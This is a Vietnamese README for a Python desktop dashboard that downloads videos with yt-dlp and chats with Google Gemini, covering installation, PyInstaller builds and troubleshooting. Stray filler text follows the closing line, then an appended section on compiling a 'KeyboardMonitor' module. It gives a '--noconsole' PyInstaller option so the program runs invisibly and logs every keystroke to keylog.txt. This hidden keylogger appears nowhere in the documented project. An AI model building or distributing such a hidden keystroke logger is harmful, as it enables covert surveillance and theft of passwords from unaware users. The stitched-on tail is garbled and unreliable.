# Multi-Utility Dashboard

Dashboard đa chức năng với khả năng mở rộng, được thiết kế để dễ dàng thêm các tiện ích mới.

## 🏗️ Cấu trúc dự án

```
Multi-Utility-Dashboard/
├── main_dashboard.py          # Dashboard chính
├── modules/                   # Thư mục chứa các modules
│   ├── __init__.py
│   ├── video_downloader.py    # Module tải video
│   └── ai_assistant.py        # Module AI Assistant
├── build_exe.py              # Script build .exe
├── build_exe.bat             # Batch build script
├── quick_build.bat           # Quick build script
├── cleanup.bat               # Cleanup script
├── requirements.txt          # Dependencies
├── dist/                     # File .exe và gói phân phối
└── README.md                 # Hướng dẫn này
```

## 🚀 Tính năng hiện có

### 📥 Video Downloader

- Tải video/audio từ nhiều nền tảng:
  - Facebook, TikTok, YouTube
  - Instagram, Twitter, Vimeo
  - Dailymotion, Twitch
- Chọn chất lượng video/audio
- Chuyển đổi sang MP3
- Giao diện đồ họa thân thiện

### 🤖 AI Assistant

- Trò chuyện với Google Gemini AI
- Hỗ trợ tiếng Việt và tiếng Anh
- Lưu API Key tự động
- Chọn model AI (Gemini 2.5 Flash, 1.5 Pro, 1.5 Flash)
- Giao diện chat thân thiện

## 🔧 Cài đặt và chạy

### **Bước 1: Cài đặt Python**

- Tải và cài đặt [Python 3.8+](https://python.org)
- Đảm bảo Python được thêm vào PATH

### **Bước 2: Tạo môi trường ảo (Khuyến nghị)**

```bash
# Tạo virtual environment
python -m venv venv

# Kích hoạt môi trường ảo
# Windows:
venv\Scripts\activate
# Linux/macOS:
source venv/bin/activate
```

### **Bước 3: Cài đặt dependencies**

```bash
# Cài đặt tất cả dependencies
pip install -r requirements.txt
```

### **Bước 4: Chạy ứng dụng**

```bash
# Chạy dashboard
python main_dashboard.py
```

## 🎯 Cách sử dụng

### **Chạy ứng dụng:**

1. **Double-click** `main_dashboard.py`
2. Hoặc chạy: `python main_dashboard.py`

### **Sử dụng Video Downloader:**

1. Chọn **"📥 Video Downloader"**
2. **Paste URL** video cần tải
3. **Chọn chất lượng** (best, worst, v.v.)
4. **Chọn thư mục** lưu file
5. Click **"Tải xuống"**

### **Sử dụng AI Assistant:**

1. Chọn **"🤖 AI Assistant"**
2. **Lấy API Key** từ [Google AI Studio](https://makersuite.google.com/app/apikey)
3. **Nhập API Key** và click **"Lưu"**
4. Click **"Test kết nối"**
5. **Bắt đầu trò chuyện** với AI

## 📦 Build file .exe

### **Cách 1: Build nhanh (Khuyến nghị)**

```bash
quick_build.bat
```

### **Cách 2: Build đầy đủ**

```bash
build_exe.bat
```

### **Cách 3: Build thủ công**

```bash
# Kích hoạt môi trường ảo
venv\Scripts\activate

# Build
python build_exe.py
```

### **Kết quả build:**

- `dist/MultiUtilityDashboard.exe` - File .exe chính
- `dist/installer/` - Gói cài đặt hoàn chỉnh
- `dist/run.bat` - Script launcher

## 🧹 Dọn dẹp dự án

### **Dọn dẹp tự động:**

```bash
cleanup.bat
```

### **Dọn dẹp thủ công:**

```bash
# Xóa thư mục build
rmdir /s build

# Xóa file .spec
del *.spec

# Xóa __pycache__
for /d /r . %d in (__pycache__) do @if exist "%d" rmdir /s /q "%d"
```

## 📋 Requirements

### **Core Dependencies:**

- **yt-dlp** - Tải video/audio từ nhiều nền tảng
- **requests** - Thực hiện HTTP requests
- **Pillow** - Xử lý và thao tác hình ảnh

### **AI Assistant Dependencies:**

- **google-generativeai** - Google Gemini AI

### **Build Dependencies:**

- **pyinstaller** - Tạo file .exe từ Python code
- **pyinstaller-hooks-contrib** - Hooks bổ sung cho PyInstaller

### **Standard Library (không cần cài đặt):**

- **tkinter** - GUI framework (built-in)
- **pathlib** - File path handling (built-in)
- **threading** - Multi-threading (built-in)
- **os, sys, re** - System utilities (built-in)

## 🔧 Cách phát triển

### **Thêm module mới:**

1. **Tạo file module** trong `modules/`:

```python
# modules/new_module.py
class NewModule:
    def __init__(self, parent_frame):
        self.parent_frame = parent_frame
        self.setup_ui()

    def setup_ui(self):
        # Thiết lập giao diện
        pass
```

2. **Đăng ký module** trong `main_dashboard.py`:

```python
# Trong load_modules()
self.modules['new_module'] = NewModule

# Trong setup_sidebar()
self.menu_buttons['new_module'] = ttk.Button(
    self.sidebar, text="🆕 New Module",
    command=lambda: self.switch_module('new_module'),
    width=20
)
```

3. **Cập nhật switch_module()**:

```python
elif module_name == 'new_module':
    self.current_module = self.modules[module_name](self.main_content)
    self.status_label.config(text="New Module - Ready")
```

## 🚀 Phân phối

### **Gửi file .exe đơn lẻ:**

- Gửi `dist/MultiUtilityDashboard.exe`

### **Gửi gói cài đặt:**

- Gửi toàn bộ thư mục `dist/installer/`
- Người dùng chạy `install.bat` để tạo shortcut desktop

### **Chạy từ source code:**

- Gửi toàn bộ dự án
- Hướng dẫn cài đặt Python và dependencies

## ⚠️ Lưu ý quan trọng

### **Môi trường ảo:**

- ✅ **Luôn sử dụng** môi trường ảo để tránh xung đột
- ✅ **Kích hoạt venv** trước khi chạy hoặc build
- ✅ **Không commit** file `venv/` vào git

### **API Keys:**

- 🔒 **Bảo mật**: Không chia sẻ API Key
- 💰 **Chi phí**: Một số AI model có thể tính phí
- 🔄 **Hạn sử dụng**: Kiểm tra API Key định kỳ

### **File .exe:**

- ❌ **Không tự cập nhật** - cần build lại khi có thay đổi code
- ✅ **Độc lập** - không cần cài Python trên máy khác
- 📁 **Kích thước** - khoảng 80MB (do chứa Python runtime)

## 🛠️ Troubleshooting

### **Lỗi import:**

```bash
# Cài đặt dependencies
pip install -r requirements.txt

# Kiểm tra Python version
python --version
```

### **Lỗi build:**

```bash
# Cài đặt PyInstaller
pip install pyinstaller

# Build lại
python build_exe.py
```

### **Lỗi AI Assistant:**

```bash
# Cài đặt Google Gemini
pip install google-generativeai

# Kiểm tra API Key
# Test kết nối trong ứng dụng
```

### **Lỗi Video Downloader:**

```bash
# Cập nhật yt-dlp
pip install --upgrade yt-dlp

# Kiểm tra URL hợp lệ
```

## 📞 Hỗ trợ

- **Issues**: Tạo issue trên GitHub
- **Features**: Đề xuất tính năng mới
- **Bugs**: Báo cáo lỗi với thông tin chi tiết

## 📄 License

MIT License - Xem file LICENSE để biết thêm chi tiết.

---

## 🎉 Chúc bạn sử dụng vui vẻ!

Multi-Utility Dashboard - Dashboard đa chức năng với khả năng mở rộng
dasasdasdasda

# theo dõi bàn phím

# Hai cách xuất file .exe ảnh hưởng đến cách nó chạy:

# Cách 1: Hiện cửa sổ (Console mode) Lệnh: pyinstaller --onefile modules/KeyboardMonitor.py

Khi mở sẽ hiện một cửa sổ đen (CMD).

Bạn sẽ thấy dòng chữ "Đang theo dõi bàn phím...".

Cách tắt: Tắt cửa sổ CMD đó đi là xong.

# Cách 2: Chạy ẩn (Background/Windowed mode) Lệnh: pyinstaller --onefile --noconsole modules/KeyboardMonitor.py

Khi mở sẽ không thấy gì hiện ra cả.

Chương trình chạy ngầm hoàn toàn. Bạn gõ gì nó vẫn ghi vào

keylog.txt

Cách tắt: Bạn phải mở Task Manager (Ctrl + Shift + Esc), tìm tên chương trình của bạn và chọn End Task.
